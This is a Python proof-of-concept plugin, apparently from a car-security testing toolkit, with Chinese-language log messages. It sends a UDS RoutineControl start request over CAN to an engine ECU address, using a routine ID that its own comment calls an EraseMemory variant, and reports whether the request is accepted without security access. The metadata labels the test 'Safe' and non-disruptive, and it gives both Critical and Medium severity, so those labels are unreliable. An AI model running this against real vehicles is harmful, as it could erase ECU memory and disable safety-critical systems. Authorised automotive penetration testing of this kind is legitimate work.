"""
PoC Name: UDS RoutineControl Abuse
CVE: N/A
Component: UDS Protocol (ISO 14229)
Category: Protocol
Severity: Critical
CVSS: 8.0
Description: 尝试UDS 0x31服务执行ECU例程(如擦除内存、重置等),检测访问控制。
Prerequisites: PCAN接口, python-can库, PCAN驱动。
Usage: python3 29_UDS_RoutineControl.py PCAN_USBBUS1
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus
class UDSRoutineControlPlugin(IVIVulnerabilityPlugin):
    meta_poc_name = "UDS RoutineControl"
    meta_cve_id = "N/A"
    meta_severity = "Medium"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
        return True
    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"UDS RoutineControl测试 ({format_can_settings(settings)})...")
        try:
            import can
            bus = open_can_bus(self.params)
            # RoutineControl: startRoutine(0x01), routineID=0xDF01 (EraseMemory variant)
            msg = can.Message(arbitration_id=0x7E0,
                data=[0x04, 0x31, 0x01, 0xDF, 0x01, 0x00, 0x00, 0x00],
                is_extended_id=False)
            bus.send(msg)
            resp = bus.recv(timeout=2.0)
            if resp and len(resp.data) > 1:
                if resp.data[1] == 0x71:
                    self.logger.warning("[+] 例程执行成功！缺少安全访问控制")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Routine started: {resp.data.hex()}"
                elif resp.data[1] == 0x7F:
                    nrc = resp.data[3] if len(resp.data) > 3 else 0
                    self.logger.info(f"例程被拒绝 NRC=0x{nrc:02X}")
                    self.results["vulnerable"] = False
            else:
                self.results["vulnerable"] = False
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 29_UDS_RoutineControl.py <can_interface>")
        sys.exit(1)
    plugin = UDSRoutineControlPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
